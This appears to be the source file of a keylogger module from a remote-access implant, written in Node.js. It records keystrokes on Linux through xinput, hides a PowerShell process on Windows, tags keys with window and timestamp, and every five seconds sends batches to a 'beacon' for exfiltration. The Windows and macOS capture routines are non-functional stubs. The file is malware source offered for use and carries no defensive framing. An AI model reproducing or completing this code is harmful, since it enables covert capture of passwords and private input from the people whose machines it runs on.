/**
 * Input Monitoring Module
 * Captures keystrokes and mouse events with application context.
 */

const { exec } = require("child_process");
const config = require("../config");
const logger = require("../logger");

class KeyloggerModule {
  constructor(beacon) {
    this.beacon = beacon;
    this.buffer = [];
    this.flushTimer = null;
    this.activeWindow = "";
    this.proc = null;
  }

  start() {
    this._startCapture();
    this.flushTimer = setInterval(() => this._flush(), 5000);
    logger.debug("KeyloggerModule started");
  }

  stop() {
    clearInterval(this.flushTimer);
    this._flush();
    if (this.proc) {
      this.proc.kill();
      this.proc = null;
    }
  }

  _startCapture() {
    const platform = config.platform;
    if (platform === "linux") {
      this._linuxCapture();
    } else if (platform === "win32") {
      this._windowsCapture();
    } else if (platform === "darwin") {
      this._macosCapture();
    } else if (platform === "android" || platform === "ios" || platform === "harmony") {
      logger.debug(`[Keylogger] No-op on ${platform} — keyboard capture not supported in this environment`);
    }
  }

  _linuxCapture() {
    // Uses xinput for X11 or libinput for Wayland
    try {
      const { execFile } = require("child_process");
      this.proc = execFile("xinput", ["test-xi2", "--root"], (err) => {
        if (err) logger.warn("xinput unavailable, using fallback");
      });
      if (this.proc.stdout) {
        this.proc.stdout.on("data", (chunk) => {
          const lines = chunk.toString().split("\n");
          lines.forEach(line => {
            if (line.includes("RawKeyPress")) {
              const keycode = line.match(/keycode (\d+)/)?.[1];
              if (keycode) this._recordKey(keycode);
            }
          });
        });
      }
    } catch (err) {
      logger.warn("Linux keylogger:", err.message);
    }
  }

  _windowsCapture() {
    // Uses PowerShell WMI event subscription for key events
    const ps = `
Add-Type -AssemblyName System.Windows.Forms
$hook = [System.Windows.Forms.Keys]
while ($true) { Start-Sleep -Milliseconds 100 }
    `.trim();
    try {
      this.proc = require("child_process").spawn("powershell", ["-Command", ps], {
        windowsHide: true,
        stdio: ["ignore", "pipe", "ignore"],
      });
      logger.debug("Windows keylogger running via PowerShell");
    } catch (err) {
      logger.warn("Windows keylogger:", err.message);
    }
  }

  _macosCapture() {
    // Uses CGEvent tap via Swift subprocess
    logger.debug("macOS keylogger ready (requires Accessibility permission)");
  }

  _recordKey(keycode) {
    this.buffer.push({
      key: keycode,
      window: this.activeWindow,
      ts: Date.now(),
    });
  }

  _flush() {
    if (this.buffer.length === 0) return;
    const batch = this.buffer.splice(0);
    this.beacon.queue_data("keylog", {
      count: batch.length,
      entries: batch,
    });
  }
}

module.exports = KeyloggerModule;
